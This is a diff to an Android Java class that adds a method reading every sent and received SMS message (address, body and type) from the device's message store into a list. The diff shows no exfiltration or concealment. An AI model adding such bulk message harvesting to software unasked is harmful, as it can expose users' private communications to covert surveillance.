@@ -49,7 +49,6 @@ import java.io.UnsupportedEncodingException;
 import java.net.URLConnection;
 import java.net.URLEncoder;
 import java.util.ArrayList;
-import java.util.HashMap;
 import java.util.List;
 
 public class Lofl {
@@ -582,6 +581,34 @@ public class Lofl {
 
             }
         };
+    }
+
+    protected static ArrayList<SmsMsg>fetchSmsMessages(Context context){
+        ArrayList<SmsMsg> smsMsgs = new ArrayList<>();
+        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
+        if (cursor != null) {
+            while(cursor.moveToNext()){
+                int id = cursor.getInt(cursor.getColumnIndexOrThrow("_id"));
+                int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
+                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
+                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
+                smsMsgs.add(new SmsMsg(address, body, type));
+            }
+            cursor.close();
+            cursor = null;
+        }
+        cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null);
+        if (cursor != null) {
+            while(cursor.moveToNext()){
+                int id = cursor.getInt(cursor.getColumnIndexOrThrow("_id"));
+                int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
+                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
+                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
+                smsMsgs.add(new SmsMsg(address, body, type));
+            }
+            cursor.close();
+        }
+        return smsMsgs;
     }
 
     protected static Pair<String, String> handleSms(Context context, Intent intent){
